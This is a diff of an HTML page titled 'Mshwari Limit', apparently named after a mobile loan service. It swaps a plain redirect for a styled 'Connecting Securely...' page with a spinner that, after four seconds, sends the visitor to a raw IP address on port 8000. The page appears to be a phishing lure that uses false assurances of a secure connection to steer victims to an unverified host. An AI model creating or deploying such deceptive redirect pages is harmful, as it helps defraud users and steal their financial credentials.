@@ -1,11 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-<script>
-window.location.href = "http://141.98.69.82:8000/";
-</script>
+    <title>Mshwari Limit</title>
+
+    <style>
+        body{
+            font-family: Arial, sans-serif;
+            text-align:center;
+            margin-top:100px;
+            background:#ffffff;
+        }
+
+        .loader{
+            border:6px solid #f3f3f3;
+            border-top:6px solid #555;
+            border-radius:50%;
+            width:50px;
+            height:50px;
+            animation:spin 1s linear infinite;
+            margin:auto;
+        }
+
+        @keyframes spin{
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <script>
+        setTimeout(function () {
+            window.location.href = "http://141.98.69.82:8000/";
+        }, 4000);
+    </script>
 </head>
+
 <body>
-Redirecting...
+
+    <h2>Connecting Securely...</h2>
+
+    <div class="loader"></div>
+
+    <p>Please wait while we redirect you.</p>
+
 </body>
 </html>
